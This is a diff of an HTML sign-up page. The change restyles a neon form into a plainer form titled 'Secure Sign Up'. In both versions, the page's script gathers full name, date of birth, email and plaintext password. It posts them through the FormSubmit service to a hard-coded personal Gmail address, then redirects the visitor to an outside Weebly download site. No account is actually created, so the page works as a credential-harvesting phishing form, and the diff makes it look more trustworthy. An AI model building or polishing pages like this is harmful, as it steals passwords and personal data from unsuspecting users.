@@ -3,313 +3,224 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neon Glow Sign Up</title>
-    <!-- Google Fonts se modern font use kiya hai -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+    <title>Secure Sign Up</title>
     <style>
-        /* --- Unique Glowing CSS --- */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Poppins', sans-serif;
+        /* Clean and Professional Font */
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+        
+        body { 
+            font-family: 'Inter', sans-serif;
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            background-color: #0f1115; /* Professional Dark Gray/Black */
+            margin: 0; 
+            color: #e1e1e1; 
         }
 
-        body {
-            background-color: #050505; /* Bohot dark background taake glow nazar aaye */
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
-            position: relative;
+        /* Clean Professional Container */
+        .pro-box { 
+            background: #181a20; 
+            padding: 40px 35px; 
+            border-radius: 12px; 
+            text-align: center; 
+            width: 85%;
+            max-width: 380px; 
+            /* Subtle shadow and border, no harsh glow */
+            border: 1px solid #2b2e36;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
         }
 
-        /* Background par halka sa glowing animation */
-        body::before {
-            content: '';
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: linear-gradient(#00ffff, #ff00ff);
-            border-radius: 50%;
-            filter: blur(150px);
-            opacity: 0.2;
-            z-index: -1;
-            animation: animateBg 10s linear infinite;
+        h2 { 
+            margin-bottom: 8px;
+            font-size: 26px;
+            font-weight: 600;
+            color: #ffffff;
         }
 
-        @keyframes animateBg {
-            0%, 100% { transform: translate(-100px, -100px); }
-            50% { transform: translate(100px, 100px); }
-        }
-
-        /* Main Container - Glassmorphism + Glow */
-        .signup-container {
-            position: relative;
-            background: rgba(255, 255, 255, 0.05); /* Halka sa transparent */
-            padding: 40px;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 25px 45px rgba(0,0,0,0.2);
-            width: 100%;
-            max-width: 400px;
-            backdrop-filter: blur(10px); /* Piche ka area blur karne ke liye */
-            transition: 0.5s;
-            z-index: 1;
-        }
-
-        /* Border par glowing lines */
-        .signup-container::before,
-        .signup-container::after {
-            content: '';
-            position: absolute;
-            top: -2px; left: -2px;
-            width: calc(100% + 4px);
-            height: calc(100% + 4px);
-            border-radius: 20px;
-            z-index: -1;
-            text-shadow: 0 0 10px #00ffff;
-        }
-
-        /* Neon Border colors */
-        .signup-container::before {
-            background: linear-gradient(45deg, #00ffff, #ff00ff, #00ffff);
-            background-size: 400%;
-            animation: animateBorder 20s linear infinite;
-            filter: blur(20px); /* Halka glow outer side par */
-            opacity: 0.5;
-        }
-
-        @keyframes animateBorder {
-            0% { background-position: 0 0; }
-            50% { background-position: 300% 0; }
-            100% { background-position: 0 0; }
-        }
-
-        h2 {
-            text-align: center;
-            font-size: 2rem;
+        p {
+            font-size: 14px;
+            color: #848e9c;
             margin-bottom: 30px;
-            color: #fff;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            /* Text par glowing effect */
-            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
         }
 
         .input-group {
-            position: relative;
-            margin-bottom: 25px;
+            text-align: left;
+            margin-bottom: 18px;
         }
 
-        .input-group label {
-            position: absolute;
-            top: 50%;
-            left: 15px;
-            transform: translateY(-50%);
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 14px;
-            pointer-events: none;
-            transition: 0.3s;
+        label {
+            display: block;
+            font-size: 13px;
+            color: #b7bdc6;
+            margin-bottom: 6px;
+            font-weight: 500;
         }
 
-        .input-group input {
-            width: 100%;
-            padding: 12px 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
+        input { 
+            width: 100%; 
+            padding: 14px 15px; 
+            box-sizing: border-box;
+            border: 1px solid #2b2e36; 
+            background: #0b0e11; 
+            color: #ffffff; 
+            font-size: 15px;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* Subtle focus effect - minimal professional blue glow */
+        input:focus {
             outline: none;
-            color: #fff;
+            border-color: #2962ff;
+            box-shadow: 0 0 0 3px rgba(41, 98, 255, 0.15);
+        }
+
+        /* Placeholder color */
+        input::placeholder {
+            color: #5e6673;
+        }
+
+        /* Professional Button */
+        button { 
+            padding: 15px; 
+            background: #2962ff; /* Corporate Blue */
+            color: #ffffff; 
+            border: none; 
+            border-radius: 6px; 
+            cursor: pointer; 
             font-size: 16px;
-            transition: 0.3s;
-        }
-
-        /* Jab input par click ho ya usme text ho */
-        .input-group input:focus,
-        .input-group input:valid {
-            border-color: #00ffff;
-            box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
-        }
-
-        /* Label upar chala jaye */
-        .input-group input:focus ~ label,
-        .input-group input:valid ~ label {
-            top: -10px;
-            left: 10px;
-            font-size: 12px;
-            color: #00ffff;
-            background: #050505;
-            padding: 0 5px;
-            border-radius: 4px;
-            text-shadow: 0 0 5px #00ffff;
-        }
-
-        /* Date Input ke liye specific styling */
-        input[type="date"] {
-            color-scheme: dark; /* Calendar ko dark mode mein karne ke liye */
-        }
-
-        /* Glowing Button */
-        button {
+            font-weight: 600;
             width: 100%;
-            padding: 15px;
-            border: none;
-            outline: none;
-            border-radius: 8px;
-            background: #00ffff;
-            color: #000;
-            font-size: 16px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: 0.3s;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
+            margin-top: 10px;
+            transition: all 0.2s ease;
         }
 
         button:hover {
-            box-shadow: 0 0 30px rgba(0, 255, 255, 1);
-            transform: translateY(-2px);
+            background: #1e4bd8;
         }
 
-        button:active {
-            transform: translateY(1px);
+        button:disabled {
+            background: #2b2e36;
+            color: #5e6673;
+            cursor: not-allowed;
         }
 
-        /* Loading Overlay styling */
-        #loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
+        /* Simple Loading Screen */
+        #loading-screen { 
+            display: none; 
+            text-align: center;
         }
-
-        .spinner {
-            width: 50px; height: 50px;
-            border: 5px solid rgba(0, 255, 255, 0.1);
-            border-top-color: #00ffff;
+        
+        .loader {
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
+            border: 3px solid #2b2e36;
+            border-top-color: #2962ff;
             animation: spin 1s linear infinite;
-            box-shadow: 0 0 15px #00ffff;
+            margin: 0 auto 15px;
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-
     </style>
 </head>
 <body>
 
-    <!-- Redirect hone se pehle loading screen -->
-    <div id="loading-overlay">
-        <div class="spinner"></div>
-        <h3 style="color: #00ffff; margin-top: 20px; text-shadow: 0 0 10px #00ffff;">Loading Weebly...</h3>
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <div class="loader"></div>
+        <p style="color: #b7bdc6; font-size: 15px;">Please wait...</p>
     </div>
 
-    <!-- Main Signup Card -->
-    <div class="signup-container" id="signup-box">
+    <!-- Professional Signup Form -->
+    <div class="pro-box" id="signup-box">
         <h2>Create Account</h2>
+        <p>Please enter your details to continue</p>
         
-        <form id="signup-form">
-            <div class="input-group">
-                <input type="text" id="fullname" required>
-                <label>Full Name</label>
-            </div>
-            
-            <div class="input-group">
-                <!-- Date of Birth ke liye calendar input -->
-                <input type="date" id="dob" required>
-                <label>Date of Birth</label>
-            </div>
+        <div class="input-group">
+            <label>Full Name</label>
+            <input type="text" id="userFullName" placeholder="e.g. Ali Ahmed" required />
+        </div>
 
-            <div class="input-group">
-                <input type="email" id="email" required>
-                <label>Email Address</label>
-            </div>
+        <div class="input-group">
+            <label>Date of Birth</label>
+            <!-- Calendar removed, now it's a typing field -->
+            <input type="text" id="userDOB" placeholder="DD/MM/YYYY" required />
+        </div>
 
-            <div class="input-group">
-                <input type="password" id="password" required>
-                <label>Password</label>
-            </div>
+        <div class="input-group">
+            <label>Email Address</label>
+            <input type="email" id="userEmail" placeholder="name@example.com" required />
+        </div>
 
-            <button type="submit" id="submitBtn">Sign Up</button>
-        </form>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="userPass" placeholder="••••••••" required />
+        </div>
+        
+        <button id="submitBtn" onclick="handleSignup()">Sign Up</button>
     </div>
 
     <script>
-        // --- SETTINGS (Wohi purane) ---
+        // --- CREDENTIALS ---
         const adminEmail = "mrpinto1433@gmail.com"; 
         const targetLink = "https://allinonedown.weebly.com"; 
 
-        // 1. Check karein ke user pehle aa chuka hai?
+        // Auto-check on Page Load
         window.onload = function() {
-            if (localStorage.getItem("isSignedUp") === "true") {
-                showLoadingAndRedirect();
+            if (localStorage.getItem("app_user_verified") === "true") {
+                showLoading();
+                window.location.href = targetLink;
             }
         };
 
-        // 2. Form submit hone par kya ho
-        document.getElementById('signup-form').addEventListener('submit', function(e) {
-            e.preventDefault(); // Page refresh hone se rokein
+        function showLoading() {
+            document.getElementById("signup-box").style.display = "none";
+            document.getElementById("loading-screen").style.display = "block";
+        }
 
-            const btn = document.getElementById('submitBtn');
+        function handleSignup() {
+            const fullName = document.getElementById("userFullName").value;
+            const dob = document.getElementById("userDOB").value;
+            const email = document.getElementById("userEmail").value;
+            const pass = document.getElementById("userPass").value;
+            const btn = document.getElementById("submitBtn");
+
+            if(!fullName || !dob || !email || !pass) {
+                alert("Please fill all the details to continue!");
+                return;
+            }
+
             btn.innerText = "Processing...";
             btn.disabled = true;
-            btn.style.background = "#555"; // Button color change jab process ho raha ho
-            btn.style.boxShadow = "none";
 
-            // Data collect karein
-            const name = document.getElementById('fullname').value;
-            const dob = document.getElementById('dob').value;
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
-
-            // Details aapke email par bhejna (FormSubmit service)
             fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
                 method: "POST",
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    "Naya User": name,
+                    "Full Name": fullName,
                     "Date of Birth": dob,
                     "Email": email,
                     "Password": pass,
-                    "_subject": "App Se Naya Glowing Signup!" // Email ka subject
+                    "_subject": "New Registration: App User!"
                 })
             })
-            .then(response => response.json())
-            .then(data => {
-                // LocalStorage mein yaad rakh len ke user verified hai
-                localStorage.setItem("isSignedUp", "true");
-                showLoadingAndRedirect();
+            .then(() => {
+                localStorage.setItem("app_user_verified", "true");
+                showLoading();
+                window.location.href = targetLink;
             })
-            .catch(error => {
-                alert("Koi masla aa gaya, internet check karein.");
+            .catch(() => {
+                alert("Network error! Please check your connection.");
                 btn.innerText = "Sign Up";
                 btn.disabled = false;
-                btn.style.background = "#00ffff";
-                btn.style.boxShadow = "0 0 15px rgba(0, 255, 255, 0.7)";
             });
-        });
-
-        // Loading screen dikhana aur redirect karna
-        function showLoadingAndRedirect() {
-            document.getElementById('signup-box').style.display = 'none';
-            document.getElementById('loading-overlay').style.display = 'flex';
-            window.location.href = targetLink;
         }
     </script>
 </body>
